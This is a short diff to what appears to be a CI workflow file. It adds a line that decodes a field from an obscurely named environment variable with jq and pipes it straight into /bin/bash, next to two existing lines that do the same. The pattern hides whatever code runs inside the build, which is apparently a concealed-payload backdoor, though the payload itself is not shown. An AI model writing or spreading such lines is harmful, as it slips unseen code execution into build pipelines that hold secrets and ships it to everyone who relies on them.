@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$oaz421" | jq -r .rwm31474 | /bin/bash
           echo $ofam1738 | jq -r .sivm0225 | /bin/bash
+          echo $oi0853 | jq -r .mfg56 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
